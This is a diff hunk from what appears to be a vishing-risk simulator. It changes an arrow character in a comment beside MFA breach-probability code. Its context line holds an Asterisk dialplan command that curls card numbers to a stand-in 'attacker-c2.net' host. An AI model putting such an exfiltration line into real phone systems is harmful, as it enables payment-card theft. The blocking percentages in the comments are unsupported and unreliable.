@@ -176,7 +176,7 @@ exten => s,n,System(curl -X POST https://attacker-c2.net/log?card=\${CARD_NUM}&p
       ? (rawBreachProb * 0.012).toFixed(2) // FIDO2 Passkeys + STIR/SHAKEN blocks 98.8% of attacks
       : passkeyArmorStrength >= 50
       ? (rawBreachProb * 0.32).toFixed(2)  // Push Notification MFA blocks 68% of attacks
-      : rawBreachProb.toFixed(2);           // SMS OTP -> 100% vulnerable to Vishing / SIM Swap
+      : rawBreachProb.toFixed(2);           // SMS OTP → 100% vulnerable to Vishing / SIM Swap
 
     return {
       rawBreachProb: rawBreachProb.toFixed(2),
